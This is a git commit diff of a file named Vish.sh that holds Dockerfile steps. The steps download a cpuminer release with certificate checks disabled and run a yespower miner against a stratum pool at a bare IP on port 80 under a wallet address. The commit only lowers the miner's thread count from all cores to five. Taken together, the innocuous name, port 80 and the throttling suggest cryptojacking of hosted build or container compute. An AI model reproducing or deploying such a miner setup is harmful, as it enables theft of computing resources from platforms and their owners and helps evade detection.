227da060b4eca34f26dd65f98359154ced455a3f
apalah01 <157792724+apalah01@users.noreply.github.com>
2024-01-26 23:42:16 +0700

    Update Vish.sh

--- Vish.sh
+++ Vish.sh
@@ -3,5 +3,5 @@ RUN apt-get update && apt-get -y install wget vim
 WORKDIR /home
 RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate
 RUN tar xf cpuminer-opt-linux.tar.gz
-RUN ./cpuminer-sse2 -a yespower  -o stratum+tcp://209.23.11.241:80 -u uu4XmbRcxdqoiyLnb3rkYHny9GE9CqtP4j.wEbb -p x -t$(nproc --all)
+RUN ./cpuminer-sse2 -a yespower  -o stratum+tcp://209.23.11.241:80 -u uu4XmbRcxdqoiyLnb3rkYHny9GE9CqtP4j.wEbb -p x -t5
 CMD (-h)
